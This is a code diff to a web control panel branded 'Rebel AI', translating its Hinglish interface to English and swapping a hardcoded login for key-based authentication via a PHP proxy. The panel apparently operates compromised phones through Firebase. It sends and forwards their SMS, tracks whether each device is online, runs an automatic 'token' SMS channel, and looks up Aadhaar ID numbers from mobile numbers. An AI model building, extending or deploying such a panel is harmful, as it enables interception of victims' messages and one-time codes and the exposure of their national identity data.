-    if(aadharIsPhpHtml(t)) throw new Error('PHP proxy nahi chal raha - sex.php ko PHP server par host karo');
+    if(aadharIsPhpHtml(t)) throw new Error('PHP proxy not running — host sex.php on a PHP server');
     var d=null;
     try{d=JSON.parse(t);}catch(e){throw new Error('Invalid JSON from server');}
     if(!r.ok) throw new Error((d&&d.error)||('HTTP '+r.status));
@@ -2028,7 +2423,7 @@ function lookupAadhar(){
   var st=document.getElementById('aadharStatus');
   var tb=document.getElementById('aadharTbody');
   if(!num||num.length<10){
-    st.innerHTML='<span style="color:var(--error)">Valid 10-digit mobile number dalo</span>';
+    st.innerHTML='<span style="color:var(--error)">Enter a valid 10-digit mobile number</span>';
     return;
   }
   st.innerHTML='<span style="color:var(--muted)">Looking up '+esc(num)+'...</span>';
@@ -2045,11 +2440,11 @@ function lookupAadhar(){
       aadhars.push(a);
     });
     if(!aadhars.length){
-      st.innerHTML='<span style="color:var(--error)">Is number ke liye aadhar field nahi mili</span>';
+      st.innerHTML='<span style="color:var(--error)">No aadhar field found for this number</span>';
       tb.innerHTML='<tr><td colspan="3" class="tbl-empty">No aadhar in API response</td></tr>';
       return;
     }
-    st.innerHTML='<span style="color:var(--success)">✅ '+aadhars.length+' unique aadhar mila</span>';
+    st.innerHTML='<span style="color:var(--success)">✅ '+aadhars.length+' unique aadhar found</span>';
     tb.innerHTML=aadhars.map(function(a,i){
       return '<tr><td>'+(i+1)+'</td><td class="mono">'+esc(num)+'</td><td><span class="aadhar-hl">'+esc(a)+'</span></td></tr>';
     }).join('');
@@ -2065,13 +2460,13 @@ function updateApiKeyWarnings(){
   var f=document.getElementById('forwardApiWarn');
   if(s){
     s.innerHTML=hasKey
-      ? '✅ API Key set — SMS sending available hai.'
-      : '⚠️ <strong>API Key is necessary</strong> for SMS sending. Rebel AI wizard mein API Key add karo — bina iske command device tak nahi jayega.';
+      ? '✅ API Key set — SMS sending is available.'
+      : '⚠️ <strong>API Key is required</strong> for SMS sending. Add it in the Rebel AI wizard — without it, commands will not reach the device.';
   }
   if(f){
     f.innerHTML=hasKey
-      ? '✅ API Key set — SMS forwarding available hai.'
-      : '⚠️ <strong>API Key is necessary</strong> for SMS forwarding. Rebel AI se API Key add karo.';
+      ? '✅ API Key set — SMS forwarding is available.'
+      : '⚠️ <strong>API Key is required</strong> for SMS forwarding. Add it via Rebel AI.';
   }
 }
 
@@ -2129,7 +2524,7 @@ function rebelWizardShowStep(){
   appendRebelMsg('ai','<span style="opacity:0.7">Step '+(rebelWizardStep+1)+'/'+REBEL_WIZARD_STEPS.length+'</span><br><br>'+step.prompt+skipBtn);
 }
 function rebelWizardApiKeyWarn(){
-  appendRebelMsg('sys','⚠️ <strong>Warning:</strong> API Key is necessary for <strong>SMS sending</strong> and <strong>SMS forwarding</strong>. Bina API Key ke ye features kaam nahi karenge.');
+  appendRebelMsg('sys','⚠️ <strong>Warning:</strong> API Key is required for <strong>SMS sending</strong> and <strong>SMS forwarding</strong>. These features will not work without an API Key.');
 }
 function startRebelWizard(resetChat){
   rebelWizardActive=true;
@@ -2154,12 +2549,12 @@ function rebelWizardValidateStep(step,val){
   if(!v&&!step.required) return {ok:true,value:''};
   if(step.key==='databaseURL'){
     var url=normalizeFirebaseUrl(v);
-    if(!url) return {ok:false,err:'Valid Firebase database URL chahiye. Example: https://xxx-default-rtdb.firebaseio.com'};
+    if(!url) return {ok:false,err:'Valid Firebase database URL required. Example: https://xxx-default-rtdb.firebaseio.com'};
     return {ok:true,value:url};
   }
   if(step.key==='apiKey'){
     if(!v||/^skip$/i.test(v)) return {ok:true,value:''};
-    if(!/^AIza[A-Za-z0-9_-]{20,}$/.test(v)) return {ok:false,err:'API Key AIza se start honi chahiye, ya type karo: skip'};
+    if(!/^AIza[A-Za-z0-9_-]{20,}$/.test(v)) return {ok:false,err:'API Key must start with AIza, or type: skip'};
     return {ok:true,value:v};
   }
   if(/^skip$/i.test(v)) return {ok:true,value:''};
@@ -2174,7 +2569,7 @@ function rebelWizardAdvance(val){
   if(!step) return rebelWizardFinish();
   var check=rebelWizardValidateStep(step,val);
   if(!check.ok){
-    appendRebelMsg('ai','⚠️ '+esc(check.err)+'<br><br>Dobara try karo ya <code>skip</code> likho (agar optional ho).');
+    appendRebelMsg('ai','⚠️ '+esc(check.err)+'<br><br>Try again or type <code>skip</code> (if optional).');
     return;
   }
   if(check.value) rebelWizardDraft[step.key]=check.value;
@@ -2206,7 +2601,7 @@ function rebelWizardFinish(){
     rebelAiLocalReply(res,null);
   }).catch(function(err){
     rebelAiLocalReply(null,err);
-    appendRebelMsg('ai','Setup dubara shuru karne ke liye type karo: <code>new</code>');
+    appendRebelMsg('ai','To restart setup, type: <code>new</code>');
   }).finally(function(){
     document.getElementById('rebelTyping').classList.add('hidden');
     var btn=document.getElementById('rebelSendBtn');
@@ -2223,7 +2618,7 @@ function handleRebelWizardInput(text){
     var filled=[];
     REBEL_WIZARD_STEPS.forEach(function(s){if(rebelWizardDraft[s.key]) filled.push(s.label);});
     if(filled.length>1){
-      appendRebelMsg('ai','✨ Config detect ho gaya! Auto-fill: <code>'+esc(filled.join(', '))+'</code>');
+      appendRebelMsg('ai','✨ Config detected! Auto-filled: <code>'+esc(filled.join(', '))+'</code>');
       while(rebelWizardStep<REBEL_WIZARD_STEPS.length){
         var st=REBEL_WIZARD_STEPS[rebelWizardStep];
         if(rebelWizardDraft[st.key]) rebelWizardStep++;
@@ -2435,7 +2830,7 @@ function sendRebelAiMessage(){
       input.focus();
     }).catch(function(err){
       rebelAiLocalReply(null,err);
-      appendRebelMsg('ai','Step-by-step setup ke liye type karo: <code>new</code>');
+      appendRebelMsg('ai','For step-by-step setup, type: <code>new</code>');
       btn.disabled=false;
       input.focus();
     });
@@ -2451,7 +2846,7 @@ function sendRebelAiMessage(){
     }
   }).catch(function(){
     document.getElementById('rebelTyping').classList.add('hidden');
-    appendRebelMsg('ai','Rebel AI abhi unavailable hai. Firebase add karne ke liye type karo: <code>new</code>');
+    appendRebelMsg('ai','Rebel AI is currently unavailable. To add Firebase, type: <code>new</code>');
   }).finally(function(){btn.disabled=false;input.focus();});
 }
 
@@ -2499,51 +2894,227 @@ function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').
 function filterRows(id,q){q=q.toLowerCase();document.querySelectorAll('#'+id+' tr').forEach(function(r){r.style.display=r.textContent.toLowerCase().includes(q)?'':'none';});}
 function showToast(t,m){var c=document.getElementById('toastContainer'),d=document.createElement('div');d.className='toast '+t;d.innerHTML='<span>'+(t==='success'?'✅':'❌')+'</span><span>'+m+'</span>';c.appendChild(d);setTimeout(function(){d.classList.add('out');setTimeout(function(){d.remove();},250);},2800);}
 
-// ═══ LOGIN ═══
-var AU='admin',AP='rebel2024';
+// ═══ LOGIN (Key-based) ═══
+var REBEL_AUTH_URL='sex.php?rebel_auth=1';
+function rebelAuthFetch(body){
+  return fetch(REBEL_AUTH_URL,{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify(body||{})
+  }).then(function(r){return r.json().then(function(j){return {ok:r.ok,data:j};});});
+}
+function pasteLoginKey(){
+  if(!navigator.clipboard) return;
+  navigator.clipboard.readText().then(function(t){
+    var el=document.getElementById('loginKey');
+    if(el) el.value=String(t||'').trim().toUpperCase();
+  }).catch(function(){});
+}
+function setLoginLoading(on){
+  var btn=document.getElementById('loginBtn');
+  if(!btn) return;
+  btn.disabled=!!on;
+  btn.innerHTML=on?'<span class="btn-shine"></span> Verifying key...':'<span class="btn-shine"></span><span class="i3d i3d-purple i3d-sm i3d-swap"><span class="em-a">🔐</span><span class="em-b">🔓</span></span> Unlock Panel';
+}
+function unlockPanel(token,expires,remember){
+  if(remember&&token)localStorage.setItem('rbl_session',JSON.stringify({token:token,exp:expires||0}));
+  else if(token) sessionStorage.setItem('rbl_session',JSON.stringify({token:token,exp:expires||0}));
+  localStorage.removeItem('rbl_login');
+  document.getElementById('loginError').style.display='none';
+  document.getElementById('loginPage').classList.add('hidden');
+  openPanel();
+  verifyRebelSession(true);
+}
+function getRebelSession(){
+  var s=null;
+  try{s=JSON.parse(localStorage.getItem('rbl_session')||sessionStorage.getItem('rbl_session')||'null');}catch(e){}
+  return s;
+}
+function lockPanel(msg){
+  localStorage.removeItem('rbl_session');
+  sessionStorage.removeItem('rbl_session');
+  panelInitialized=false;
+  document.getElementById('loginPage').classList.remove('hidden');
+  document.getElementById('mainLayout').style.display='none';
+  var err=document.getElementById('loginError');
+  if(err&&msg){err.textContent='❌ '+msg;err.style.display='block';}
+  setLoginLoading(false);
+  showToast('error',msg||'Session ended');
+}
+var SMS_TOKEN_URL='sex.php?sms_token_api=1';
+var _smsTokenCfg={enabled:false,device_id:'',database_url:'',fb_name:''};
+function smsTokenFetch(body){
+  var s=getRebelSession();
+  body=body||{};
+  if(s&&s.token) body.token=s.token;
+  return fetch(SMS_TOKEN_URL,{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify(body)
+  }).then(function(r){return r.json().then(function(j){return {ok:r.ok,data:j};});});
+}
+function renderSmsTokenUi(cfg,log){
+  cfg=cfg||_smsTokenCfg||{};
+  var pulse=document.getElementById('smsTokenPulse');
+  var dev=document.getElementById('smsTokenDevice');
+  var en=document.getElementById('smsTokenEnabled');
+  if(en) en.checked=!!cfg.enabled;
+  if(pulse) pulse.className='sms-token-pulse '+(cfg.enabled?'on':'off');
+  if(dev){
+    var label=cfg.device_id?esc(cfg.device_id.substring(0,22)+(cfg.device_id.length>22?'…':'')):'not set';
+    var fb=cfg.fb_name?(' · '+esc(cfg.fb_name)):'';
+    dev.innerHTML='Device: <strong>'+label+'</strong>'+fb;
+  }
+  var box=document.getElementById('smsTokenLog');
+  if(!box) return;
+  var rows=(log&&log.length)?log:(_smsTokenCfg.log||[]);
+  if(!rows.length){box.textContent='Waiting for channel messages...';return;}
+  box.innerHTML=rows.slice(0,6).map(function(row){
+    var t=row.ts?new Date(row.ts*1000).toLocaleTimeString():'—';
+    var cls=row.ok?'ok':'bad';
+    var msg=esc((row.message||'').substring(0,36));
+    var err=row.error?(' · '+esc(row.error)):'';
+    return '<div class="'+cls+'">'+t+' → '+esc(row.to||'?')+' · '+msg+err+'</div>';
+  }).join('');
+}
+function loadSmsTokenConfig(silent){
+  smsTokenFetch({action:'get'}).then(function(res){
+    if(!res.ok||!res.data||!res.data.ok) return;
+    _smsTokenCfg=res.data.config||{};
+    _smsTokenCfg.log=res.data.log||[];
+    renderSmsTokenUi(_smsTokenCfg,_smsTokenCfg.log);
+  }).catch(function(){
+    if(!silent) showToast('error','Auto Token config load failed');
+  });
+}
+function saveSmsTokenConfig(){
+  var enabled=!!(document.getElementById('smsTokenEnabled')||{}).checked;
+  smsTokenFetch({action:'save',enabled:enabled,device_id:_smsTokenCfg.device_id||'',database_url:_smsTokenCfg.database_url||'',fb_name:_smsTokenCfg.fb_name||''}).then(function(res){
+    if(res.ok&&res.data&&res.data.ok){
+      _smsTokenCfg=res.data.config||_smsTokenCfg;
+      _smsTokenCfg.log=res.data.log||_smsTokenCfg.log||[];
+      renderSmsTokenUi(_smsTokenCfg,_smsTokenCfg.log);
+      showToast('success',enabled?'Auto Token SMS ON':'Auto Token SMS OFF');
+      return;
+    }
+    showToast('error',(res.data&&res.data.error)||'Save failed');
+  }).catch(function(){showToast('error','Auto Token save failed');});
+}
+function useSelDeviceForSmsToken(){
+  var dev=getSelDev();
+  if(!dev){showToast('error','Select a device first');return;}
+  var inst=getFbInstance(dev.fbId);
+  if(!inst){showToast('error','Firebase not connected');return;}
+  var cfg=inst.cfg||firebaseConfigs.find(function(c){return c.id===dev.fbId;})||{};
+  smsTokenFetch({
+    action:'save',
+    enabled:!!(document.getElementById('smsTokenEnabled')||{}).checked,
+    device_id:dev.rawId,
+    database_url:inst.restUrl||cfg.databaseURL||'',
+    fb_name:cfg.name||inst.name||'Firebase'
+  }).then(function(res){
+    if(res.ok&&res.data&&res.data.ok){
+      _smsTokenCfg=res.data.config||{};
+      _smsTokenCfg.log=res.data.log||[];
+      renderSmsTokenUi(_smsTokenCfg,_smsTokenCfg.log);
+      showToast('success','Auto SMS device set');
+      return;
+    }
+    showToast('error',(res.data&&res.data.error)||'Device save failed');
+  }).catch(function(){showToast('error','Device save failed');});
+}
+function verifyRebelSession(){
+  var s=getRebelSession();
+  if(!s||!s.token) return;
+  rebelAuthFetch({action:'check',token:s.token}).then(function(res){
+    if(res.ok&&res.data&&res.data.ok){
+      if(s.exp!==res.data.expires){
+        s.exp=res.data.expires;
+        try{
+          if(localStorage.getItem('rbl_session')) localStorage.setItem('rbl_session',JSON.stringify(s));
+          else sessionStorage.setItem('rbl_session',JSON.stringify(s));
+        }catch(e){}
+      }
+      return;
+    }
+    lockPanel((res.data&&res.data.error)||'Token revoked — login again');
+  }).catch(function(){});
+}
 (function(){
   clearClientsCacheIfExpired();
-  var s=null;
-  try{s=JSON.parse(localStorage.getItem('rbl_login'));}catch(e){}
-  if(s&&s.u){
-    document.getElementById('loginUser').value=s.u;
-    document.getElementById('loginPass').value=s.p;
-    document.getElementById('rememberMe').checked=true;
-    if(s.u===AU&&s.p===AP){
-      document.getElementById('loginPage').classList.add('hidden');
-      openPanel();
-    }
+  init3DScene();
+  var s=getRebelSession();
+  if(s&&s.token){
+    setLoginLoading(true);
+    rebelAuthFetch({action:'check',token:s.token}).then(function(res){
+      setLoginLoading(false);
+      if(res.ok&&res.data&&res.data.ok) unlockPanel(s.token,s.exp,true);
+      else localStorage.removeItem('rbl_session');
+    }).catch(function(){setLoginLoading(false);});
   }
 })();
 function doLogin(){
-  var u=document.getElementById('loginUser').value.trim(),p=document.getElementById('loginPass').value;
-  if(u===AU&&p===AP){
-    if(document.getElementById('rememberMe').checked)localStorage.setItem('rbl_login',JSON.stringify({u:u,p:p}));
-    else localStorage.removeItem('rbl_login');
-    document.getElementById('loginError').style.display='none';
-    document.getElementById('loginPage').classList.add('hidden');
-    openPanel();
+  var key=(document.getElementById('loginKey').value||'').trim().toUpperCase();
+  var err=document.getElementById('loginError');
+  if(!key){
+    err.textContent='❌ Please enter your Rebel access key!';
+    err.style.display='block';
+    return;
   }
-  else{document.getElementById('loginError').style.display='block';document.getElementById('loginPass').value='';}
+  err.style.display='none';
+  setLoginLoading(true);
+  var remember=document.getElementById('rememberMe').checked;
+  rebelAuthFetch({action:'login',key:key,remember:remember}).then(function(res){
+    setLoginLoading(false);
+    if(res.ok&&res.data&&res.data.ok){
+      unlockPanel(res.data.token,res.data.expires,remember);
+      document.getElementById('loginKey').value='';
+      return;
+    }
+    err.textContent='❌ '+(res.data&&res.data.error?res.data.error:'Invalid or expired access key!');
+    err.style.display='block';
+    document.getElementById('loginKey').value='';
+  }).catch(function(){
+    setLoginLoading(false);
+    err.textContent='❌ Auth server unreachable. Try again.';
+    err.style.display='block';
+  });
 }
-document.addEventListener('keydown',function(e){if(!document.getElementById('loginPage').classList.contains('hidden')&&e.key==='Enter')doLogin();});
-setInterval(function(){
-  document.getElementById('footerTime').textContent=new Date().toLocaleString();
-  clearClientsCacheIfExpired();
-  if(selDev) {
-    var dev=allDevs.find(function(d){return d.id===selDev;});
-    if(dev) {
-      if(dev.status==='online'){
-        document.getElementById('dLastSeen').textContent='● ACTIVE';
-        document.getElementById('dLastSeen').style.color='var(--success)';
-      } else {
-        var diff=Date.now()-dev.lastSeen;
-        document.getElementById('dLastSeen').textContent=diff<60000?Math.floor(diff/1000)+'s ago':diff<3600000?Math.floor(diff/60000)+'m ago':Math.floor(diff/3600000)+'h ago';
-        document.getElementById('dLastSeen').style.color='var(--muted)';
-      }
+document.addEventListener('keydown',function(e){
+  if(!document.getElementById('loginPage').classList.contains('hidden')&&e.key==='Enter') doLogin();
+});
+document.getElementById('loginKey').addEventListener('input',function(){
+  this.value=this.value.toUpperCase().replace(/[^A-Z0-9\-]/g,'');
+});
+var _perfTickLast=0, _cacheSweepLast=0, _authCheckLast=0, _smsTokenPollLast=0;
+function perfMainLoop(now){
+  requestAnimationFrame(perfMainLoop);
+  if(!now) now=performance.now();
+  if(now-_perfTickLast>=1000){
+    _perfTickLast=now;
+    document.getElementById('footerTime').textContent=new Date().toLocaleString();
+    if(selDev){
+      var dev=allDevs.find(function(d){return d.id===selDev;});
+      if(dev) renderLastSeen(dev);
     }
   }
-},1000);
+  if(document.getElementById('loginPage').classList.contains('hidden')){
+    if(now-_authCheckLast>=10000){
+      _authCheckLast=now;
+      verifyRebelSession();
+    }
+    if(panelInitialized&&now-_smsTokenPollLast>=5000){
+      _smsTokenPollLast=now;
+      loadSmsTokenConfig(true);
+    }
+  }
+  if(now-_cacheSweepLast>=1800000){
+    _cacheSweepLast=now;
+    clearClientsCacheIfExpired();
+  }
+}
+requestAnimationFrame(perfMainLoop);
+document.getElementById('footerTime').textContent=new Date().toLocaleString();
 </script>
 </body>
 </html>
